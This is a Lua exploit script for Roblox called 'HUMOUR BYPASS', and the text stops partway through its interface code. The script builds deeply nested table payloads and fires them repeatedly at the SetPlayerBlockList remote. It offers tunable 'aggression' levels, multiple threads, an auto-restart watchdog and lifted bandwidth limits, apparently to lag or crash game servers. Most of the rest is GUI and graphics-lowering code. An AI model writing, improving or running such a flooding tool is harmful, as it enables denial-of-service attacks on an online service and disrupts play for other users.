local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local UIS         = game:GetService("UserInputService")
local TweenService= game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Lighting    = game:GetService("Lighting")
local NetworkClient = game:GetService("NetworkClient")
local LP = Players.LocalPlayer

-- ══════════════════════════════════════════════════════════════════════
-- PALETTE
-- ══════════════════════════════════════════════════════════════════════
local PINK        = Color3.fromRGB(255, 105, 180)
local PINK_BRIGHT = Color3.fromRGB(255, 150, 210)
local BLACK       = Color3.fromRGB(0, 0, 0)
local WHITE       = Color3.fromRGB(255, 255, 255)

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG
-- ══════════════════════════════════════════════════════════════════════
local Config = {
    Enabled       = false,
    PowerValue    = 97000,
    Mode          = "PC",
    ToggleKey     = Enum.KeyCode.V,
    IsVisible     = true,
    UILocked      = false,
    AutoBrainrot  = false,
    FpsProtect    = true,
    Aggression    = "NORMAL",   -- LIGHT | NORMAL | AGGRESSIVE | MAX
    AutoThrottle  = true,
    Position      = {X_Scale = 0.5, X_Offset = -170, Y_Scale = 0.5, Y_Offset = -80}
}

local DEPTH = 350

-- ══════════════════════════════════════════════════════════════════════
-- AGGRESSION PRESETS
-- ══════════════════════════════════════════════════════════════════════
local AGGRESSION = {
    LIGHT      = { baseDelay = 0.10, jitter = 0.03,  tries = 1, threads = 1 },
    NORMAL     = { baseDelay = 0.05, jitter = 0.02,  tries = 1, threads = 1 },
    AGGRESSIVE = { baseDelay = 0.03, jitter = 0.015, tries = 2, threads = 1 },
    MAX        = { baseDelay = 0.02, jitter = 0.008, tries = 3, threads = 2 },
}
local AGGRESSION_ORDER = {"LIGHT", "NORMAL", "AGGRESSIVE", "MAX"}

local AGGRESSION_COLORS = {
    LIGHT      = {bg = BLACK,       bgTr = 0.40, text = PINK,       stroke = PINK,        strokeTr = 0.35},
    NORMAL     = {bg = PINK,        bgTr = 0.00, text = BLACK,      stroke = PINK_BRIGHT, strokeTr = 0.00},
    AGGRESSIVE = {bg = PINK_BRIGHT, bgTr = 0.00, text = BLACK,      stroke = WHITE,       strokeTr = 0.10},
    MAX        = {bg = WHITE,       bgTr = 0.00, text = PINK,       stroke = PINK_BRIGHT, strokeTr = 0.00},
}

local MODE_MULT = { PC = 1.0, Mobile = 1.6 }  -- multiply delay (mobile slower)

-- ══════════════════════════════════════════════════════════════════════
-- STATE
-- ══════════════════════════════════════════════════════════════════════
local PLState = {
    running = false,
    threads = {},
}
local payloadCache = {}
local blockRemote  = nil
local Stats = { sends = 0, startTime = 0, nodesSent = 0 }
local fpsCounter = { frames = 0, last = os.clock(), fps = 60 }

local ConfigFile = "HumourBypass_Config.json"

-- ══════════════════════════════════════════════════════════════════════
-- SAVE / LOAD
-- ══════════════════════════════════════════════════════════════════════
local function SaveConfig()
    if not writefile then return end
    local data = {
        Position = Config.Position, PowerValue = Config.PowerValue,
        Mode = Config.Mode, ToggleKey = Config.ToggleKey.Name,
        UILocked = Config.UILocked, AutoBrainrot = Config.AutoBrainrot,
        FpsProtect = Config.FpsProtect,
        Aggression = Config.Aggression, AutoThrottle = Config.AutoThrottle,
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if not (isfile and isfile(ConfigFile)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
    if not (ok and data) then return end
    if data.Position    then Config.Position = data.Position end
    if data.PowerValue  then Config.PowerValue = data.PowerValue end
    if data.Mode        then Config.Mode = data.Mode end
    if data.ToggleKey   then Config.ToggleKey = Enum.KeyCode[data.ToggleKey] or Enum.KeyCode.V end
    if data.UILocked   ~= nil then Config.UILocked = data.UILocked end
    if data.AutoBrainrot ~= nil then Config.AutoBrainrot = data.AutoBrainrot end
    if data.FpsProtect ~= nil then Config.FpsProtect = data.FpsProtect end
    if data.Aggression and AGGRESSION[data.Aggression] then
        Config.Aggression = data.Aggression
    elseif data.DelayMode then
        local map = {FAST = "NORMAL", NORMAL = "NORMAL", SLOW = "LIGHT"}
        Config.Aggression = map[data.DelayMode] or "NORMAL"
    end
    if data.AutoThrottle ~= nil then Config.AutoThrottle = data.AutoThrottle end
end
LoadConfig()

-- ══════════════════════════════════════════════════════════════════════
-- REMOTE DISCOVERY
-- ══════════════════════════════════════════════════════════════════════
local function refreshRemote()
    blockRemote = nil
    pcall(function()
        local rs = game:FindFirstChild("RobloxReplicatedStorage")
        if rs then blockRemote = rs:FindFirstChild("SetPlayerBlockList") end
    end)
    if not blockRemote then
        pcall(function()
            blockRemote = game:GetService("ReplicatedStorage"):FindFirstChild("SetPlayerBlockList", true)
        end)
    end
end
refreshRemote()

-- ══════════════════════════════════════════════════════════════════════
-- PAYLOAD BUILDER + CACHE
-- ══════════════════════════════════════════════════════════════════════
local function buildPayload(depth, count)
    local mainTable = {}
    local spammed = {}
    table.insert(spammed, {})
    local z = spammed[1]
    for _ = 1, depth do
        local t = {}
        table.insert(z, t)
        z = t
    end
    for _ = 1, count do
        table.insert(mainTable, spammed)
    end
    return mainTable
end

local function rebuildCache()
    payloadCache = {}
    for i = 1, 4 do
        local d = DEPTH + (i - 1) * 13
        local count = math.clamp(math.floor(Config.PowerValue / (d + 2)), 1, 999999)
        payloadCache[i] = {
            data  = buildPayload(d, count),
            depth = d,
            count = count,
            nodes = count * (d + 2) + 1,
        }
    end
end

local function firePayload(payload)
    if blockRemote then
        blockRemote:FireServer(payload)
    else
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(payload)
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- PING / FPS / THROTTLE
-- ══════════════════════════════════════════════════════════════════════
local function getPing()
    local ok, ping = pcall(function() return LP:GetNetworkPing() end)
    if ok and ping then
        return ping > 5 and ping or ping * 1000
    end
    return 0
end

RunService.RenderStepped:Connect(function()
    fpsCounter.frames = fpsCounter.frames + 1
    local now = os.clock()
    if now - fpsCounter.last >= 1 then
        fpsCounter.fps = fpsCounter.frames / (now - fpsCounter.last)
        fpsCounter.frames = 0
        fpsCounter.last = now
    end
end)

local function throttleMultiplier()
    if not Config.AutoThrottle then return 1.0 end
    local m = 1.0
    local ping = getPing()
    if     ping > 200 then m = m * 2.5
    elseif ping > 100 then m = m * 1.8
    elseif ping >  60 then m = m * 1.2 end
    local fps = fpsCounter.fps
    if     fps < 30 then m = m * 2.0
    elseif fps < 45 then m = m * 1.5 end
    return m
end

-- ══════════════════════════════════════════════════════════════════════
-- BYPASS ENGINE
-- ══════════════════════════════════════════════════════════════════════
local function stopBypass()
    PLState.running = false
    for _, t in ipairs(PLState.threads) do
        pcall(function() task.cancel(t) end)
    end
    PLState.threads = {}
end

local function startBypass(power)
    stopBypass()
    Config.PowerValue = power
    PLState.running = true
    refreshRemote()
    rebuildCache()

    local preset    = AGGRESSION[Config.Aggression] or AGGRESSION.NORMAL
    local modeMult  = MODE_MULT[Config.Mode] or 1.0
    local nThreads  = preset.threads

    Stats.sends = 0
    Stats.nodesSent = 0
    Stats.startTime = os.clock()

    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)

    for _ = 1, nThreads do
        local thr = task.spawn(function()
            while PLState.running do
                pcall(function()
                    NetworkClient:SetOutgoingKBPSLimit(math.huge)
                end)
                local v = payloadCache[math.random(1, #payloadCache)]
                if v then
                    for _ = 1, preset.tries do
                        local ok = pcall(firePayload, v.data)
                        if ok then
                            Stats.sends = Stats.sends + 1
                            Stats.nodesSent = Stats.nodesSent + v.nodes
                        else
                            refreshRemote()
                        end
                    end
                end
                local delay = preset.baseDelay * modeMult * throttleMultiplier()
                              + math.random() * preset.jitter
                task.wait(delay)
            end
        end)
        table.insert(PLState.threads, thr)
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- WATCHDOG + RESPAWN
-- ══════════════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(2)
        if Config.Enabled and PLState.running then
            local alive = false
            for _, t in ipairs(PLState.threads) do
                if coroutine.status(t) ~= "dead" then alive = true break end
            end
            if not alive then startBypass(Config.PowerValue) end
        end
    end
end)

LP.CharacterAdded:Connect(function()
    task.delay(1, function()
        refreshRemote()
        if Config.Enabled then startBypass(Config.PowerValue) end
    end)
end)

-- ══════════════════════════════════════════════════════════════════════
-- FPS PROTECT (unchanged)
-- ══════════════════════════════════════════════════════════════════════
local fpSaved = setmetatable({}, {__mode = "k"})
local fpConns, fpEnabled = {}, false

local function fpIsProtected(obj)
    local char = LP.Character
    if char and (obj == char or obj:IsDescendantOf(char)) then return true end
    if obj:IsA("LayerCollector") or obj:IsA("GuiObject") or obj:IsA("GuiBase2d") then return true end
    local p = obj
    while p and p ~= workspace do
        local n = p.Name or ""
        if n:match("^Humour") then return true end
        p = p.Parent
    end
    return false
end
local function fpSave(obj, prop, val)
    local b = fpSaved[obj] or {}; fpSaved[obj] = b
    if b[prop] == nil then b[prop] = val end
end
local function fpCull(obj)
    if not fpEnabled or not obj or not obj.Parent or fpIsProtected(obj) then return end
    pcall(function()
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
           or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Light") then
            fpSave(obj, "Enabled", obj.Enabled); obj.Enabled = false
        elseif obj:IsA("PostEffect") then
            fpSave(obj, "Enabled", obj.Enabled); obj.Enabled = false
        elseif obj:IsA("Sky") then
            fpSave(obj, "StarCount", obj.StarCount); fpSave(obj, "CelestialBodiesShown", obj.CelestialBodiesShown)
            obj.StarCount = 0; obj.CelestialBodiesShown = false
        elseif obj:IsA("Atmosphere") then
            fpSave(obj, "Density", obj.Density); fpSave(obj, "Haze", obj.Haze); fpSave(obj, "Glare", obj.Glare)
            obj.Density = 0; obj.Haze = 0; obj.Glare = 0
        elseif obj:IsA("Clouds") then
            fpSave(obj, "Enabled", obj.Enabled); obj.Enabled = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            fpSave(obj, "Transparency", obj.Transparency); obj.Transparency = 1
        elseif obj:IsA("SurfaceAppearance") then
            fpSave(obj, "Parent", obj.Parent); obj.Parent = nil
        elseif obj:IsA("BasePart") then
            fpSave(obj, "CastShadow", obj.CastShadow); fpSave(obj, "Reflectance", obj.Reflectance)
            obj.CastShadow = false; obj.Reflectance = 0
            if obj:IsA("MeshPart") then
                fpSave(obj, "RenderFidelity", obj.RenderFidelity)
                pcall(function() obj.RenderFidelity = Enum.RenderFidelity.Performance end)
            end
        end
    end)
end
local function fpEnable()
    if fpEnabled then return end
    fpEnabled = true
    fpSave(Lighting, "GlobalShadows", Lighting.GlobalShadows)
    pcall(function() Lighting.GlobalShadows = false end)
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
    pcall(function()
        UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
    end)
    pcall(function()
        local t = workspace:FindFirstChildOfClass("Terrain")
        if t then
            fpSave(t, "Decoration", t.Decoration)
            fpSave(t, "WaterWaveSize", t.WaterWaveSize)
            fpSave(t, "WaterWaveSpeed", t.WaterWaveSpeed)
            fpSave(t, "WaterReflectance", t.WaterReflectance)
            t.Decoration = false; t.WaterWaveSize = 0; t.WaterWaveSpeed = 0; t.WaterReflectance = 0
        end
    end)
    task.spawn(function()
        local pending = {}
        for _, c in ipairs(workspace:GetChildren()) do table.insert(pending, c) end
        for _, c in ipairs(Lighting:GetChildren())  do table.insert(pending, c) end
        while #pending > 0 and fpEnabled do
            local deadline = os.clock() + 0.002
            while #pending > 0 and os.clock() < deadline do
                local obj = table.remove(pending); fpCull(obj)
                local ok, kids = pcall(function() return obj:GetChildren() end)
                if ok then for _, c in ipairs(kids) do table.insert(pending, c) end end
            end
            RunService.Heartbeat:Wait()
        end
    end)
    table.insert(fpConns, workspace.DescendantAdded:Connect(function(o) task.defer(function() fpCull(o) end) end))
    table.insert(fpConns, Lighting.DescendantAdded:Connect(function(o)  task.defer(function() fpCull(o) end) end))
end
local function fpDisable()
    if not fpEnabled then return end
    fpEnabled = false
    for _, c in ipairs(fpConns) do pcall(function() c:Disconnect() end) end
    fpConns = {}
    for obj, props in pairs(fpSaved) do
        pcall(function() for prop, val in pairs(props) do obj[prop] = val end end)
    end
    fpSaved = setmetatable({}, {__mode = "k"})
end

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, name in pairs({"AntiDieUI","SpeedBypassUI","PingLaggerCrasherBypassUI","HumourBypassUI"}) do
    local old = game:GetService("CoreGui"):FindFirstChild(name)
    if old then old:Destroy() end
end

-- ══════════════════════════════════════════════════════════════════════
-- CREATE GUI
-- ══════════════════════════════════════════════════════════════════════
local gui = Instance.new("ScreenGui")
gui.Name = "HumourBypassUI"
gui.ResetOnSpawn = false
gui.DisplayOrder = 10
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = game:GetService("CoreGui")

local MAIN_W = 340
local MAIN_H = 262
local MIN_H  = 78

local main = Instance.new("Frame", gui)
main.Name = "Main"
main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
main.Position = UDim2.new(Config.Position.X_Scale, Config.Position.X_Offset, Config.Position.Y_Scale, Config.Position.Y_Offset)
main.BackgroundColor3 = BLACK
main.BackgroundTransparency = 1
main.BorderSizePixel = 0
main.Active = true
main.ClipsDescendants = true
main.ZIndex = 1
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
local mainStroke = Instance.new("UIStroke", main)
mainStroke.Color = PINK; mainStroke.Thickness = 1.5; mainStroke.Transparency = 0.35

-- Drag
local dragging, dragInput, dragStart, mainStart
main.InputBegan:Connect(function(inp)
    if Config.UILocked then return end
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = inp.Position; mainStart = main.Position
        inp.Changed:Connect(function()
            if inp.UserInputState == Enum.UserInputState.End then
                dragging = false
                Config.Position = {X_Scale = main.Position.X.Scale, X_Offset = main.Position.X.Offset,
                                   Y_Scale = main.Position.Y.Scale, Y_Offset = main.Position.Y.Offset}
                SaveConfig()
            end
        end)
    end
end)
main.InputChanged:Connect(function(inp)
    if Config.UILocked then return end
    if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
        dragInput = inp
    end
end)
UIS.InputChanged:Connect(function(inp)
    if Config.UILocked or inp ~= dragInput or not dragging then return end
    local dx = inp.Position.X - dragStart.X
    local dy = inp.Position.Y - dragStart.Y
    main.Position = UDim2.new(mainStart.X.Scale, mainStart.X.Offset+dx, mainStart.Y.Scale, mainStart.Y.Offset+dy)
end)

-- ══════════════════════════════════════════════════════════════════════
-- HEADER
-- ══════════════════════════════════════════════════════════════════════
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, 0, 0, 30)
header.BackgroundColor3 = BLACK
header.BackgroundTransparency = 0.75
header.BorderSizePixel = 0
header.ZIndex = 4
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
local headerStroke = Instance.new("UIStroke", header)
headerStroke.Color = PINK; headerStroke.Thickness = 1; headerStroke.Transparency = 0.55

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size = UDim2.new(0, 200, 1, 0)
titleLbl.Position = UDim2.new(0, 12, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "HUMOUR BYPASS"
titleLbl.TextColor3 = PINK
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 13
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.TextStrokeColor3 = BLACK
titleLbl.TextStrokeTransparency = 0.4
titleLbl.ZIndex = 5

local statusPill = Instance.new("Frame", header)
statusPill.Size = UDim2.new(0, 44, 0, 18)
statusPill.Position = UDim2.new(1, -122, 0.5, -9)
statusPill.BackgroundColor3 = BLACK
statusPill.BackgroundTransparency = 0.4
statusPill.BorderSizePixel = 0
statusPill.ZIndex = 5
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
local statusStroke = Instance.new("UIStroke", statusPill)
statusStroke.Color = PINK; statusStroke.Thickness = 1; statusStroke.Transparency = 0.2

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size = UDim2.new(1, 0, 1, 0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = "OFF"
statusLbl.TextColor3 = PINK
statusLbl.Font = Enum.Font.GothamBlack
statusLbl.TextSize = 9
statusLbl.TextStrokeColor3 = BLACK
statusLbl.TextStrokeTransparency = 0.5
statusLbl.ZIndex = 6

local function mkIconBtn(text, xpos)
    local btn = Instance.new("TextButton", header)
    btn.Size = UDim2.new(0, 24, 0, 24)
    btn.Position = UDim2.new(1, xpos, 0.5, -12)
    btn.BackgroundColor3 = BLACK
    btn.BackgroundTransparency = 0.4
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Text = text
    btn.TextColor3 = PINK
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 12
    btn.ZIndex = 6
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    local s = Instance.new("UIStroke", btn); s.Color = PINK; s.Thickness = 1; s.Transparency = 0.4
    btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundTransparency = 0.15}):Play() end)
    btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundTransparency = 0.4}):Play() end)
    return btn
end

local minBtn  = mkIconBtn("−", -36)
local lockBtn = mkIconBtn(Config.UILocked and "🔒" or "🔓", -64)
lockBtn.MouseButton1Click:Connect(function()
    Config.UILocked = not Config.UILocked
    lockBtn.Text = Config.UILocked and "🔒" or "🔓"
    SaveConfig()
end)

-- ══════════════════════════════════════════════════════════════════════
-- ACTIVATE
-- ══════════════════════════════════════════════════════════════════════
local activateBtn = Instance.new("TextButton", main)
activateBtn.Size = UDim2.new(1, -16, 0, 34)
activateBtn.Position = UDim2.new(0, 8, 0, 36)
activateBtn.BackgroundColor3 = BLACK
activateBtn.BackgroundTransparency = 0.4
activateBtn.BorderSizePixel = 0
activateBtn.AutoButtonColor = false
activateBtn.Text = ""
activateBtn.ZIndex = 4
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 8)
local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color = PINK; activateStroke.Thickness = 2; activateStroke.Transparency = 0.15

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1, 0, 1, 0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = PINK
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 13
activateLbl.TextStrokeColor3 = BLACK
activateLbl.TextStrokeTransparency = 0.35
activateLbl.ZIndex = 5

-- ══════════════════════════════════════════════════════════════════════
-- ROW BUILDER
-- ══════════════════════════════════════════════════════════════════════
local function makeRow(y)
    local r = Instance.new("Frame", main)
    r.Size = UDim2.new(1, -16, 0, 26)
    r.Position = UDim2.new(0, 8, 0, y)
    r.BackgroundTransparency = 1
    r.ZIndex = 4
    return r
end
local function makeLabel(parent, x, w, text)
    local l = Instance.new("TextLabel", parent)
    l.Size = UDim2.new(0, w, 1, 0)
    l.Position = UDim2.new(0, x, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = PINK
    l.Font = Enum.Font.GothamBold
    l.TextSize = 11
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextStrokeColor3 = BLACK
    l.TextStrokeTransparency = 0.5
    l.ZIndex = 5
    return l
end
local function makeBtn(parent, x, w, h, text)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(0, w, 1, h)
    b.Position = UDim2.new(0, x, 0, 2)
    b.BackgroundColor3 = BLACK
    b.BackgroundTransparency = 0.4
    b.BorderSizePixel = 0
    b.AutoButtonColor = false
    b.Text = text
    b.TextColor3 = PINK
    b.Font = Enum.Font.GothamBold
    b.TextSize = 11
    b.ZIndex = 5
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    local s = Instance.new("UIStroke", b); s.Color = PINK; s.Thickness = 1; s.Transparency = 0.35
    b:SetAttribute("_stroke", nil) -- keep API simple: expose stroke via closure below
    b.Name = "Btn"
    b:SetAttribute("_ok", true)
    local stroke = Instance.new("UIStroke", b) -- duplicate guard
    stroke:Destroy()
    -- Store stroke in a weak table
    rawset(_G, "_btnStrokes", rawget(_G, "_btnStrokes") or setmetatable({}, {__mode="k"}))
    _G._btnStrokes[b] = s
    return b
end
local function btnStroke(b) return _G._btnStrokes[b] end

-- ══════════════════════════════════════════════════════════════════════
-- ROW 1: POWER + PC/MOBILE
-- ══════════════════════════════════════════════════════════════════════
local row1 = makeRow(76)
makeLabel(row1, 4, 50, "Power:")
local powerInput = Instance.new("TextBox", row1)
powerInput.Size = UDim2.new(0, 90, 1, -4)
powerInput.Position = UDim2.new(0, 58, 0, 2)
powerInput.BackgroundColor3 = BLACK
powerInput.BackgroundTransparency = 0.4
powerInput.BorderSizePixel = 0
powerInput.Text = tostring(Config.PowerValue)
powerInput.TextColor3 = PINK
powerInput.Font = Enum.Font.GothamBold
powerInput.TextSize = 12
powerInput.ClearTextOnFocus = false
powerInput.ZIndex = 5
Instance.new("UICorner", powerInput).CornerRadius = UDim.new(0, 6)
local powerStroke = Instance.new("UIStroke", powerInput)
powerStroke.Color = PINK; powerStroke.Thickness = 1; powerStroke.Transparency = 0.35

local pcBtn = Instance.new("TextButton", row1)
pcBtn.Size = UDim2.new(0, 62, 1, -4)
pcBtn.Position = UDim2.new(1, -134, 0, 2)
pcBtn.BackgroundColor3 = BLACK
pcBtn.BackgroundTransparency = 0.4
pcBtn.BorderSizePixel = 0
pcBtn.AutoButtonColor = false
pcBtn.Text = "PC"
pcBtn.TextColor3 = PINK
pcBtn.Font = Enum.Font.GothamBold
pcBtn.TextSize = 10
pcBtn.ZIndex = 5
Instance.new("UICorner", pcBtn).CornerRadius = UDim.new(0, 6)
local pcStroke = Instance.new("UIStroke", pcBtn)
pcStroke.Color = PINK; pcStroke.Thickness = 1; pcStroke.Transparency = 0.35

local mobileBtn = Instance.new("TextButton", row1)
mobileBtn.Size = UDim2.new(0, 62, 1, -4)
mobileBtn.Position = UDim2.new(1, -68, 0, 2)
mobileBtn.BackgroundColor3 = BLACK
mobileBtn.BackgroundTransparency = 0.4
mobileBtn.BorderSizePixel = 0
mobileBtn.AutoButtonColor = false
mobileBtn.Text = "Mobile"
mobileBtn.TextColor3 = PINK
mobileBtn.Font = Enum.Font.GothamBold
mobileBtn.TextSize = 10
mobileBtn.ZIndex = 5
Instance.new("UICorner", mobileBtn).CornerRadius = UDim.new(0, 6)
local mobileStroke = Instance.new("UIStroke", mobileBtn)
mobileStroke.Color = PINK; mobileStroke.Thickness = 1; mobileStroke.Transparency = 0.35

-- ══════════════════════════════════════════════════════════════════════
-- ROW 2: KEYBIND
-- ══════════════════════════════════════════════════════════════════════
local row2 = makeRow(108)
makeLabel(row2, 4, 70, "Keybind:")
local keyBtn = Instance.new("TextButton", row2)
keyBtn.Size = UDim2.new(0, 120, 1, -4)
keyBtn.Position = UDim2.new(0, 78, 0, 2)
keyBtn.BackgroundColor3 = BLACK
keyBtn.BackgroundTransparency = 0.4
keyBtn.BorderSizePixel = 0
keyBtn.AutoButtonColor = false
keyBtn.Text = Config.ToggleKey.Name
keyBtn.TextColor3 = PINK
keyBtn.Font = Enum.Font.GothamBold
keyBtn.TextSize = 11
keyBtn.ZIndex = 5
Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 6)
local keyStroke = Instance.new("UIStroke", keyBtn)
keyStroke.Color = PINK; keyStroke.Thickness = 1; keyStroke.Transparency = 0.35

-- ══════════════════════════════════════════════════════════════════════
-- ROW 3: AUTO BRAINROT
-- ══════════════════════════════════════════════════════════════════════
local row3 = makeRow(140)
makeLabel(row3, 4, 110, "Auto Brainrot:")
local brainrotBtn = Instance.new("TextButton", row3)
brainrotBtn.Size = UDim2.new(0, 90, 1, -4)
brainrotBtn.Position = UDim2.new(1, -94, 0, 2)
brainrotBtn.BackgroundColor3 = BLACK
brainrotBtn.BackgroundTransparency = 0.4
brainrotBtn.BorderSizePixel = 0
brainrotBtn.AutoButtonColor = false
brainrotBtn.Text = Config.AutoBrainrot and "ON" or "OFF"
brainrotBtn.TextColor3 = PINK
brainrotBtn.Font = Enum.Font.GothamBold
brainrotBtn.TextSize = 11
brainrotBtn.ZIndex = 5
Instance.new("UICorner", brainrotBtn).CornerRadius = UDim.new(0, 6)
local brainrotStroke = Instance.new("UIStroke", brainrotBtn)
brainrotStroke.Color = PINK; brainrotStroke.Thickness = 1; brainrotStroke.Transparency = 0.35

-- ══════════════════════════════════════════════════════════════════════
-- ROW 4: FPS PROTECT
-- ══════════════════════════════════════════════════════════════════════
local row4 = makeRow(172)
makeLabel(row4, 4, 110, "FPS Protect:")
local fpsBtn = Instance.new("TextButton", row4)
fpsBtn.Size = UDim2.new(0, 90, 1, -4)
fpsBtn.Position = UDim2.new(1, -94, 0, 2)
fpsBtn.BackgroundColor3 = BLACK
fpsBtn.BackgroundTransparency = 0.4
fpsBtn.BorderSizePixel = 0
fpsBtn.AutoButtonColor = false
fpsBtn.Text = Config.FpsProtect and "ON" or "OFF"
fpsBtn.TextColor3 = PINK
fpsBtn.Font = Enum.Font.GothamBold
fpsBtn.TextSize = 11
fpsBtn.ZIndex = 5
Instance.new("UICorner", fpsBtn).CornerRadius = UDim.new(0, 6)
local fpsStroke = Instance.new("UIStroke", fpsBtn)
fpsStroke.Color = PINK; fpsStroke.Thickness = 1; fpsStroke.Transparency = 0.35

-- ══════════════════════════════════════════════════════════════════════
-- ROW 5: AGGRESSION + AUTO-THROTTLE  (NEW)
-- ══════════════════════════════════════════════════════════════════════
local row5 = makeRow(204)
makeLabel(row5, 4, 50, "Aggr:")

local aggrBtn = Instance.new("TextButton", row5)
aggrBtn.Size = UDim2.new(0, 100, 1, -4)
aggrBtn.Position = UDim2.new(0, 58, 0, 2)
aggrBtn.BackgroundColor3 = BLACK
aggrBtn.BackgroundTransparency = 0.4
aggrBtn.BorderSizePixel = 0
aggrBtn.AutoButtonColor = false
aggrBtn.Text = Config.Aggression
aggrBtn.TextColor3 = PINK
aggrBtn.Font = Enum.Font.GothamBold
aggrBtn.TextSize = 10
aggrBtn.ZIndex = 5
Instance.new("UICorner", aggrBtn).CornerRadius = UDim.new(0, 6)
local aggrStroke = Instance.new("UIStroke", aggrBtn)
aggrStroke.Color = PINK; aggrStroke.Thickness = 1; aggrStroke.Transparency = 0.35

makeLabel(row5, 166, 56, "Throttle:")
local throttleBtn = Instance.new("TextButton", row5)
throttleBtn.Size = UDim2.new(0, 90, 1, -4)
throttleBtn.Position = UDim2.new(1, -94, 0, 2)
throttleBtn.BackgroundColor3 = BLACK
throttleBtn.BackgroundTransparency = 0.4
throttleBtn.BorderSizePixel = 0
throttleBtn.AutoButtonColor = false
throttleBtn.Text = Config.AutoThrottle and "ON" or "OFF"
throttleBtn.TextColor3 = PINK
throttleBtn.Font = Enum.Font.GothamBold
throttleBtn.TextSize = 10
throttleBtn.ZIndex = 5
Instance.new("UICorner", throttleBtn).CornerRadius = UDim.new(0, 6)
local throttleStroke = Instance.new("UIStroke", throttleBtn)
throttleStroke.Color = PINK; throttleStroke.Thickness = 1; throttleStroke.Transparency = 0.35

-- ══════════════════════════════════════════════════════════════════════
-- STATS STRIP  (NEW)
-- ══════════════════════════════════════════════════════════════════════
local statsStrip = Instance.new("Frame", main)
statsStrip.Size = UDim2.new(1, -16, 0, 20)
statsStrip.Position = UDim2.new(0, 8, 0, 234)
statsStrip.BackgroundColor3 = BLACK
statsStrip.BackgroundTransparency = 0.7
statsStrip.BorderSizePixel = 0
statsStrip.ZIndex = 4
Instance.new("UICorner", statsStrip).CornerRadius = UDim.new(0, 6)

local statsLbl = Instance.new("TextLabel", statsStrip)
statsLbl.Size = UDim2.new(1, -8, 1, 0)
statsLbl.Position = UDim2.new(0, 4, 0, 0)
statsLbl.BackgroundTransparency = 1
statsLbl.Text = "idle"
statsLbl.TextColor3 = PINK
statsLbl.Font = Enum.Font.Code
statsLbl.TextSize = 11
statsLbl.TextXAlignment = Enum.TextXAlignment.Center
statsLbl.ZIndex = 5

-- ══════════════════════════════════════════════════════════════════════
-- STATE UPDATER
-- ══════════════════════════════════════════════════════════════════════
local function applyToggleStyle(btn, stroke, on)
    if on then
        btn.BackgroundColor3 = PINK; btn.BackgroundTransparency = 0
        btn.TextColor3 = BLACK; stroke.Color = PINK_BRIGHT; stroke.Transparency = 0
        btn.Text = "ON"
    else
        btn.BackgroundColor3 = BLACK; btn.BackgroundTransparency = 0.4
        btn.TextColor3 = PINK; stroke.Color = PINK; stroke.Transparency = 0.35
        btn.Text = "OFF"
    end
end

local function updateUIState()
    if Config.Enabled then
        statusLbl.Text = "ON"; statusLbl.TextColor3 = BLACK
        statusPill.BackgroundColor3 = PINK; statusPill.BackgroundTransparency = 0
        statusStroke.Color = PINK; statusStroke.Transparency = 0
        activateBtn.BackgroundColor3 = PINK; activateBtn.BackgroundTransparency = 0
        activateLbl.Text = "ACTIVE"; activateLbl.TextColor3 = BLACK; activateLbl.TextStrokeTransparency = 1
        activateStroke.Color = PINK_BRIGHT; activateStroke.Thickness = 2.5; activateStroke.Transparency = 0
        mainStroke.Color = PINK_BRIGHT; mainStroke.Transparency = 0.05
    else
        statusLbl.Text = "OFF"; statusLbl.TextColor3 = PINK
